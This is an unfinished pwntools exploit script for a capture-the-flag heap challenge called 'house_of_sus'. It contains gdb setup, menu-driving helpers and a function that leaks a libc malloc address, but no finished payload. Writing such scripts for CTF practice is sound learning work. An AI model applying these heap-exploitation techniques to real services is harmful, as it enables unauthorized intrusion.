#!/usr/bin/env python3

from pwn import *
import random

exe = "./house_of_sus"
elf = ELF("./house_of_sus")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"

gdbscript = """
define hv
heap-view
end
define av
x/16gx &main_arena
end
define wv
x/64gx 0x405000
end
continue
"""

if args.REMOTE:
    p = remote("addr", 1337)

elif args.DEBUG:
    p = gdb.debug([exe], gdbscript=gdbscript)
elif args.RUN:
    p = process([exe])
else:
    p = process([exe])
    gdb.attach(p, gdbscript=gdbscript)


def call_meeting(size: int, content: bytes):
    p.recvuntil(b"Call an emergency meeting")
    p.recvline()
    p.recvline()
    p.send(b"3")  # choose option 3 for call meeting
    p.recvline()
    p.send(str(size).encode())
    p.send(content)
    p.recvuntil(b"responded: ")  # responded
    print(p.recv(32))
    print(p.recvuntil(b"(You)"))  # end of vote menu
    p.send(b"21")
    p.recvline()  # newline
    p.recvline()  # newline
    p.recvline()  # Enter your choice:
    p.recvline()  # You voted to

    # p.send(str(size).encode())
    # p.recvuntil(b"response: ")
    # p.send(content)
    # p.recvuntil(b"responded: ")
    # print(p.recv(8))
    # p.send(str(size).encode())
    # p.send(str(size).encode())
    # p.recvuntil(b"Enter your response: ")
    # p.send(content)


def leak():
    p.send(b"1")
    p.recvuntil(b": ")
    p.recvline()
    malloc_libc = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    info(f"Leaked libc malloc: {malloc_libc:#0x}")
    return malloc_libc


def main():
    p.recvuntil(b"meeting")
    p.send(b"1")

    p.interactive()


if __name__ == "__main__":
    main()
